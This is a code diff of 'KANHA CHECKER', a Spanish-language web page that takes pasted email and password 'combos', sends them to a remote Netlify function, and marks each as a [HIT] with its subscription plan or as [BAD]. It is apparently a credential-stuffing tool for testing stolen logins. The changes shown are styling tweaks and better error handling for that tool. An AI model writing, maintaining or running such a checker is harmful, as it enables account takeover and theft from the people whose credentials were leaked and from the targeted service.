@@ -3,12 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>KANHA Checker</title>
+    <title>KANHA CHECKER</title>
     <style>
         body { background: #0a0a0a; color: #0f0; font-family: monospace; text-align: center; padding: 20px; }
         textarea { width: 90%; max-width: 600px; height: 150px; background: #111; color: #0f0; border: 1px solid #0f0; padding: 10px; font-family: monospace; }
-        button { background: #0f0; color: #000; padding: 12px 30px; font-weight: bold; border: none; margin-top: 15px; }
-        #result { background: #111; padding: 15px; margin-top: 20px; text-align: left; white-space: pre-wrap; border: 1px solid #333; }
+        button { background: #0f0; color: #000; padding: 12px 30px; font-weight: bold; border: none; margin-top: 15px; cursor: pointer; }
+        #result { background: #111; padding: 15px; margin-top: 20px; text-align: left; white-space: pre-wrap; border: 1px solid #333; max-width: 600px; margin-left: auto; margin-right: auto; font-size: 14px;}
         .hit { color: #0f0; } .bad { color: #f00; }
     </style>
 </head>
@@ -21,8 +21,9 @@
         async function startCheck() {
             const combos = document.getElementById('combos').value.trim();
             const resultDiv = document.getElementById('result');
-            if (!combos) return resultDiv.innerHTML = "<span class='bad'>Poné algo.</span>";
-            resultDiv.innerHTML = "Chequeando...";
+            if (!combos) return resultDiv.innerHTML = "<span class='bad'>Poné algo, AGENT man.</span>";
+            
+            resultDiv.innerHTML = "Chequeando... (esto puede tardar)";
             try {
                 const res = await fetch("https://fascinating-panda-466eb7.netlify.app/.netlify/functions/check", {
                     method: 'POST',
@@ -30,13 +31,20 @@
                     body: JSON.stringify({ combos: combos.split('\n') })
                 });
                 const data = await res.json();
+                
+                // ACÁ ESTÁ EL BLINDAJE: Si no hay "results", mostramos el error
+                if (!data.results) {
+                    resultDiv.innerHTML = `<span class='bad'>Error del Backend: ${JSON.stringify(data)}</span>`;
+                    return;
+                }
+
                 let html = "";
                 data.results.forEach(r => {
                     html += r.valid ? `<span class="hit">[HIT] ${r.email} | ${r.plan}</span>\n` : `<span class="bad">[BAD] ${r.email} | ${r.reason}</span>\n`;
                 });
                 resultDiv.innerHTML = html;
             } catch (e) {
-                resultDiv.innerHTML = `<span class='bad'>Error: ${e.message}</span>`;
+                resultDiv.innerHTML = `<span class='bad'>Error de conexión: ${e.message}</span>`;
             }
         }
     </script>
